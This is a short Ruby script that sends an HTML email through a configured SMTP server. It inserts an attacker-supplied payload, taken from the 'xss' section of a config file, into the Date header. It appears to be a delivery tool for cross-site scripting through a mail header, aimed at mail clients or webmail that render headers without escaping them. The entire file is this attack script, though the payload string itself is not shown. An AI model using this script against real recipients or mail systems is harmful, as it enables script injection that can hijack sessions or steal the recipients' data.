#!/usr/bin/env ruby

require 'net/smtp'
require 'yaml'

c = YAML.load_file('config.yml')['xss']

from_addr = c['from_addr']
to_addr = c['to_addr']
smtp_srv = c['smtp_srv']
smtp_port = c['smtp_port']

from_name = c['from_name']
to_name = c['to_name']
subject = c['subject']
body = c['body']

payload = c['payload']

msgstr = <<EOM
From: #{from_name} <#{from_addr}>
To: #{to_name} <#{to_addr}>
Subject: #{subject}
Date: #{payload}
Content-type: text/html

#{body}
EOM

Net::SMTP.start(smtp_srv, smtp_port) do |smtp|
  smtp.send_message msgstr, from_addr, to_addr
end